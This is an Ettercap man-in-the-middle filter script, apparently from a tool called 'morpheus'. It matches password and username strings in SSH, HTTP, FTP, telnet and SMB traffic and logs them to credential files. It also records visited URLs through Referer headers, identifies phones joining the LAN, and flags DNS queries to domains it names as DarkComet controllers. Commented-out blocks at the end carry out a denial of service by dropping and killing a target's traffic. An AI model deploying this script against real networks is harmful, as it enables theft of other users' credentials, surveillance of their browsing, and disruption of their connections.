if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 22) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:22   [tcp] ssh ☆");
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }
        }
        }
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 23) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:23   [tcp] telnet ☆");
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:80   [tcp] http ☆");
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./http_creds.log");
         msg("\n[morpheus] host:TaRTWO   [ ⊶  ]   found ..");
         msg("[morpheus] | status: HTTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./http_creds.log");
         msg("\n[morpheus] host:TaRTWO   [ ⊶  ]   found ..");
         msg("[morpheus] | status: HTTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./http_creds.log");
         msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
         msg("[morpheus] | status: HTTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }
        }
        }
}
#
# grab target url visited referer
#
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 80) {
  if (search(DATA.data, "Referer:")) {
   log(DATA.data, "./Referer.log");
   msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
   msg("[morpheus] | status: packet Referer found");
   msg("[morpheus] |_  log : morpheus/logs/Referer.log ✔\n");
  }
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:139  [tcp] netbios ☆");
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:443  [tcp] https ☆");
    if (search(DATA.data, "safebrowsing")) {
      msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
      msg("[morpheus] | status: safebrowsing googleapis query found ☆");
      msg("[morpheus] |_ info : SSL encrypted google traffic\n");
    }
}
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:445  [tcp] netbios ☠");
}
#
# IF YOU WANT TO BE PARANOIC, LEAVE THIS FUNTION AS IT IS  ..
# IF NOT THEN YOU NEED TO COMMENT ( # ) THIS ENTIRE PARANOIC FUNTION
#
# DHCP: requests, discovery ..
if (ip.src == 'TaRTWO' && ip.proto == UDP && udp.dst == 67) {
  if (search(DATA.data, "android-d3d4ee5705593d227")) {
    msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : smartphone Announces is presence");
    msg("[morpheus] |_ name : android-d3d4ee5705593d227\n");
  }else{
  if (search(DATA.data, "android")) {
    msg("\n[morpheus] host:TaRTWO   [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : smartphone Announces is presence");
    msg("[morpheus] |_ name : android [unknown]\n");
  }else{
  if (search(DATA.data, "com.apple.mobile")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : IOS Announces is presence");
    msg("[morpheus] |_ device: APPLE/IOS [unknown]\n");
  }else{
  if (search(DATA.data, "Darwin")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : IOS Announces is presence");
    msg("[morpheus] |_ device: APPLE/IOS [unknown]\n");
    }
    }
    }
    }
}
# END OF PARANOIC FUNTION ..





##
# from OUTSIDE ->  TARGET2
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 21) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:21   [tcp] ftp ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 22) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:22   [tcp] ssh ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 23) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:23   [tcp] telnet ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 80) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:80   [tcp] http ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 139) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:139  [tcp] netbios ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 443) {
  msg("[morpheus] host:TaRTWO   [ <- ]  port:443  [tcp] https ☆");
}
if (ip.dst == 'TaRTWO' && ip.proto == TCP && tcp.src == 445) {
  msg("\n[morpheus] host:TaRTWO   [ <- ]  port:445  [tcp] netbios ☠");
  msg("[morpheus] | status: remote connection detected!");
  msg("[morpheus] |_ info : port used by netapi vulnerability.\n");
}





#########################################################
##           modem 192.168.1.254 connections           ##
#########################################################
##
# from MODEM -> OUTSIDE
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 21) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:21   [tcp] ftp ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 22) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:22   [tcp] ssh ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 23) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:23   [tcp] telnet ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 80) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:80   [tcp] http ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 139) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:139  [tcp] netbios ☠");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 443) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:443  [tcp] https ☆");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 445) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:445  [tcp] netbios ☠");
}
if (ip.src == 'MoDeM' && ip.proto == TCP && tcp.src == 8080) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:8080 [tcp] http-alt ☆");
}
#
# IF YOU WANT TO BE PARANOIC, LEAVE THIS FUNTION AS IT IS  ..
# IF NOT THEN YOU NEED TO COMMENT ( # ) THIS ENTIRE PARANOIC FUNTION
#
if (ip.src == 'MoDeM' && ip.proto == UDP && udp.src == 53) {
  msg("[morpheus] host:MoDeM  [ -> ]  port:53   [udp] dns ☆");
}
# [ END OF PARANOIC FUNTION ] ..




##
# from OUTSIDE -> MODEM
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 21) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:21   [tcp] ftp ☠");
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ftp_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: FTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ftp_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: FTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ftp_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: FTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
       }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./ftp_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: FTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./ftp_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: FTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./ftp_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: FTP login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }
        }
        }
        }
        }
        }
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 22) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:22   [tcp] ssh ☆");
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
       }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }
        }
        }
        }
        }
        }
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 23) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:23   [tcp] telnet ☠");
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:MoDeM   [ ⊶  ]  found ..");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }
        }
        }
        }
        }
        }
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:80   [tcp] http ☆");
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:139  [tcp] netbios ☠");
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:443  [tcp] https ☆");
}
if (ip.dst == 'MoDeM' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:445  [tcp] netbios ☠");
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./smb_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SMB login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./smb_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SMB login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./smb_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SMB login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./smb_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SMB login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./smb_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SMB login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./smb_creds.log");
         msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
         msg("[morpheus] | status: SMB login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }
        }
        }
        }
        }
        }
}
#
# IF YOU WANT TO BE PARANOIC, LEAVE THIS FUNTION AS IT IS  ..
# IF NOT THEN YOU NEED TO COMMENT ( # ) THIS ENTIRE PARANOIC FUNTION
#
# DHCP DISCOVER: what devices (smartphones) are anuncing is presence to modem.
# Its writen to identify my phones, but it will report the connection of androids/IOS devices.
if (ip.src == '0.0.0.0' && ip.proto == UDP && udp.dst == 67) {
  if (search(DATA.data, "android-c9211f4272c7e1ef7")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : pedro smartphone (samsung)");
    msg("[morpheus] |_ device: android-c9211f4272c7e1ef7\n");
  }else{
  if (search(DATA.data, "android")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : smartphone Announces is presence");
    msg("[morpheus] |_ device: android [unknown]\n");
  }else{
  if (search(DATA.data, "com.apple.mobile")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : IOS Announces is presence");
    msg("[morpheus] |_ device: APPLE/IOS [unknown]\n");
  }else{
  if (search(DATA.data, "Darwin")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : IOS Announces is presence");
    msg("[morpheus] |_ device: APPLE/IOS [unknown]\n");
    }
    }
    }
    }
}
# DNS: requests, discovery ..
if (ip.dst == 'MoDeM' && ip.proto == UDP && udp.dst == 53) {
  msg("[morpheus] host:MoDeM  [ <- ]  port:53   [udp] dns ☠");
        if (search(DATA.data, "burtproperties")) {
          msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible DarkComet query found!");
          msg("[morpheus] |  info : DarkComet RAT controller");
          msg("[morpheus] |  hex  : 62 75 72 74 70 72 6f 70 65 72 74 69 65 73 2e 63 6f 6d");
          msg("[morpheus] |_ decoded: burtproperties.com\n");
        }else{
        if (search(DATA.data, "wilsoniusmaximus")) {
          msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible DarkComet query found!");
          msg("[morpheus] |  info : DarkComet RAT controller");
          msg("[morpheus] |  hex  : 77 69 6c 73 6f 6e 69 75 73 6d 61 78 69 6d 75 73 2e 63 6f 6d");
          msg("[morpheus] |_ decoded: wilsoniusmaximus.com\n");
        }else{
        if (search(DATA.data, "meusresultados")) {
          msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible query found");
          msg("[morpheus] |  port : 53/UDP(dst) remote DNS query");
          msg("[morpheus] |  hex  : 64 2e 6d 65 75 73 72 65 73 75 6c 74 61 64 6f 73 2e 63 6f 6d");
          msg("[morpheus] |_ decoded: d.meusresultados.com\n");
        }else{
        if (search(DATA.data, "shadows")) {
          msg("\n[morpheus] host:MoDeM  [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible DarkComet query found!");
          msg("[morpheus] |  info : DarkComet RAT controller");
          msg("[morpheus] |  hex  : 73 68 61 64 6f 77 73 2e 73 79 74 65 73 2e 6e 65 74");
          msg("[morpheus] |_ decoded: shadows.sytes.net\n");
       }
       }
       }
       }
}
# [ END OF PARANOIC FUNTION ] ..







#########################################################
##         DENIAL-OF-SERVICE ATTACK (drop,kill)        ##
#########################################################
##
# drop packet | kill connection  ..
# "un-comment" this funtion to filter any tcp/udp connections
# made to OR from target ip addr (perform D0S againts ip addr)
# "remmenber to change this ip addr for your target ip addr".
#
#if (ip.src == '192.168.1.95' || ip.dst == '192.168.1.95') {
# msg("\n[morpheus] host:192.168.1.95   [ ⊶  ]  found ..");
# msg("[morpheus] | status: block connection!");
# msg("[morpheus] |  info : drop target tcp/udp packet ✔");
# msg("[morpheus] |_ info : kill target tcp/udp connection ✔\n");
# drop();
# drop();
#kill();
#kill();
#}



##
# drop packet | kill IPv6 connection  ..
# "un-comment" this funtion to filter any tcp/udp connections
# made to OR from target ipv6 addr (perform D0S againts ipv6 addr)
# "remmenber to change this ipv6 addr for your target ipv6 addr".
#
#if (eth.proto == IP6 && ipv6.src == 'fe80::4b15:11c8:f426:205f' || ipv6.dst == 'fe80::4b15:11c8:f426:205f') {
# msg("\n[morpheus] host:fe80::4b15..   [ ⊶  ]  found ..");
# msg("[morpheus] | status: block connection!");
# msg("[morpheus] |  info : drop target IPv6 tcp/udp packet ✔");
# msg("[morpheus] |_ info : kill target IPv6 connection ✔\n");
# drop();
# drop();
#kill();
#kill();
#}

